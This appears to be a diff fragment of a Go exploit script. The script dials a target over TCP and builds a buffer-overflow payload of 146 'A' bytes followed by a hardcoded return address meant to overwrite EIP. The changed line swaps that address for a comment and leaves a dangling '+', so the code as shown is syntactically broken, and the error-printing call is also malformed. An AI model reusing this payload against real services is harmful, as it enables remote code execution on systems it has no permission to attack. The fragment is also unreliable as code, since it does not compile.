@@ -12,7 +12,7 @@ func main() {
 	ip := os.Args[1]
 	port := os.Args[2]
 	address := fmt.Sprintf("%s:%s", ip, port)
-	buffer := strings.Repeat("A", 146) + "\xc3\x14\x04\x08"
+	buffer := strings.Repeat("A", 146) + //Address of EIP
 	conn, err := net.Dial("tcp", address)
 		if err != nil {
 			fmt.Printf("Connection failed", err.Error())
